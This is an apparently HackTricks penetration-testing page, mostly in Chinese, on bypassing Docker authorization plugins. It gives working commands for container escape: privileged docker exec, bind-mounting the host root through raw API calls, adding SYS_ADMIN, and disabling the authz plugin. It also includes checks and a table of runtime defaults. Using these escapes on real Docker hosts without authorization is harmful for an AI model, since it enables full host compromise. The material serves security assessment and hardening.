# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## 概述

Runtime authorization plugins 是一个额外的策略层，用于决定调用方是否可以执行某个 daemon 操作。Docker 是典型示例。默认情况下，任何能够与 Docker daemon 通信的用户，实际上都可以对其进行广泛控制。Authorization plugins 会检查经过认证的用户以及请求的 API 操作，然后根据策略允许或拒绝请求，从而尝试收紧这一模型。

这一主题值得单独介绍，因为当攻击者已经能够访问 Docker API，或已经属于 `docker` group 时，它会改变 exploitation model。在此类环境中，问题不再只是“我能否访问 daemon？”，还包括“daemon 是否受到 authorization layer 的限制？如果受到限制，是否可以通过未处理的 endpoints、weak JSON parsing 或 plugin-management permissions 绕过该 layer？”

## Operation

当请求到达 Docker daemon 时，authorization subsystem 可以将请求上下文传递给一个或多个已安装的 plugins。Plugin 可以看到经过认证的用户身份、请求详情、选定的 headers，以及在 content type 适合时请求或响应 body 的部分内容。多个 plugins 可以串联，只有在所有 plugins 都允许请求时，访问才会被授予。

这种模型听起来很可靠，但其安全性完全取决于 policy author 对 API 的理解是否完整。如果 plugin 会阻止 `docker run --privileged`，却忽略 `docker exec`，遗漏顶层的 `Binds` 等 alternate JSON keys，或允许 plugin administration，那么它可能会制造出限制有效的假象，同时仍然保留直接的 privilege-escalation paths。

## Common Plugin Targets

进行 policy review 时，需要重点关注以下区域：

- container creation endpoints
- `HostConfig` 字段，例如 `Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode` 以及 namespace-sharing options
- `docker exec` 行为
- plugin management endpoints
- 任何能够间接触发 intended policy model 之外 runtime actions 的 endpoint

历史上，Twistlock 的 `authz` plugin，以及 `authobot` 这类简单的 educational plugins，使这一模型更容易研究，因为它们的 policy files 和 code paths 展示了 endpoint-to-action mapping 的实际实现方式。对于 assessment work，重要的经验是：policy author 必须理解完整的 API surface，而不能只了解最显眼的 CLI commands。

## Abuse

第一步是了解实际上有哪些内容被阻止。如果 daemon 拒绝某个 action，错误信息通常会 leak plugin 名称，这有助于识别正在使用的 control：
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
如果需要更广泛的 endpoint 分析，可以使用 `docker_auth_profiler` 等工具，因为它们能够自动完成检查插件实际允许哪些 API 路由和 JSON 结构这一重复性任务。

如果环境使用自定义 plugin，并且你可以与 API 交互，请枚举实际被过滤的对象字段：
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
这些检查很重要，因为许多 authorization 失败是特定于字段的，而不是特定于概念的。某个 plugin 可能会拒绝某种 CLI 模式，却没有完全阻止等效的 API 结构。

### 完整示例：`docker exec` 在容器创建后增加权限

一种阻止创建 privileged container、但允许创建 unconfined container 并使用 `docker exec` 的 policy 仍可能被绕过：
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
如果 daemon 接受第二步，用户就重新获得了容器内的特权交互式进程，而策略作者原本认为该进程已受到限制。

### Full Example: Bind Mount Through Raw API

某些存在缺陷的策略只检查一种 JSON 结构。如果 root filesystem 的 bind mount 未被一致阻止，主机仍然可以被挂载：
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
同样的思路也可能出现在 `HostConfig` 下：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影响是完全逃逸宿主机文件系统。值得注意的是，这种 bypass 源于策略覆盖不完整，而不是 kernel bug。

### 完整示例：未检查的 Capability 属性

如果策略忘记过滤与 capability 相关的属性，攻击者可能创建一个重新获得危险 capability 的 container：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
一旦存在 `CAP_SYS_ADMIN` 或类似强大的 capability，[capabilities.md](protections/capabilities.md) 和 [privileged-containers.md](privileged-containers.md) 中描述的许多 breakout 技术便变得可用。

### 完整示例：禁用 Plugin

如果允许进行 plugin-management 操作，最直接的绕过方式可能是完全关闭该控制：
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
这是控制平面层面的策略失效。授权层确实存在，但本应受到限制的用户仍然保留禁用该授权层的权限。

## 检查

这些命令旨在确定是否存在策略层，以及该策略层看起来是完整的还是仅停留在表面。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
这里有哪些值得关注的内容：

- 包含 plugin 名称的拒绝消息可以确认存在授权层，并且通常会暴露确切的实现方式。
- 攻击者可见的 plugin 列表可能足以发现是否可以执行禁用或重新配置操作。
- 如果某个策略只阻止明显的 CLI 操作，却不阻止原始 API 请求，在证实其不可绕过之前，都应将其视为可绕过。

## Runtime 默认设置

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Docker Engine | 默认未启用 | 除非配置 authorization plugin，否则对 Daemon 的访问实际上是全有或全无 | 不完整的 plugin policy、使用黑名单而非 allowlist、允许 plugin 管理、字段级盲点 |
| Podman | 没有常见的直接等价机制 | Podman 通常更多依赖 Unix 权限、rootless 执行以及 API 暴露决策，而不是 Docker 风格的 authz plugin | 广泛暴露 rootful Podman API、socket 权限薄弱 |
| containerd / CRI-O | 不同的控制模型 | 这些 Runtime 通常依赖 socket 权限、node trust boundary 以及更高层的 orchestrator 控制，而不是 Docker authz plugin | 将 socket 挂载到 workloads 中、node-local trust assumption 薄弱 |
| Kubernetes | 在 API-server 和 kubelet 层使用 authn/authz，而不是 Docker authz plugin | Cluster RBAC 和 admission controls 是主要 policy layer | RBAC 权限过宽、admission policy 薄弱、直接暴露 kubelet 或 Runtime API |

{{#include ../../../banners/hacktricks-training.md}}
